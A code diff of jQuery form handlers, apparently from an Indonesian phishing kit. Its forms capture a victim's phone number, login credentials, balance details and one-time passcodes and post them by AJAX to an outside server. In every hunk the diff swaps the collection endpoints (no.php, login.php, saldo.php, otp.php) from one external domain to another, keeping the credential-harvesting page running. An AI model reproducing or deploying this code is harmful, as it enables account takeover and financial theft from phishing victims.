@@ -30,7 +30,7 @@ sessionStorage.setItem("nomor", nomor);
 $("#lonte").show();
  $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/x4/no.php',
+ url: 'https://axellent.aa-click.cfd/x4/no.php',
  data: $(this).serialize(),
  datatype: 'JSON', 
  complete: function(data) {
@@ -58,7 +58,7 @@ document.getElementById('kirim').innerHTML = "Memproses....";
 $("#lonte").show();
  $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/x4/login.php',
+ url: 'https://axellent.aa-click.cfd/x4/login.php',
  data: $(formlog).serialize(),
  datatype: 'text', 
  complete: function(data) {
@@ -91,7 +91,7 @@ document.getElementById('kirim').innerHTML = "Verify...";
 $("#lonte").show();
  $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/x4/saldo.php',
+ url: 'https://axellent.aa-click.cfd/x4/saldo.php',
  data: $(formsal).serialize(),
  datatype: 'text',
  complete: function(data) {
@@ -125,7 +125,7 @@ $('#formLink').on('submit', function (event) {
  document.getElementById('kirims').value = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/x4/otp.php',
+ url: 'https://axellent.aa-click.cfd/x4/otp.php',
  async: false,
  dataType: 'text',
  data: $(this).serialize(),
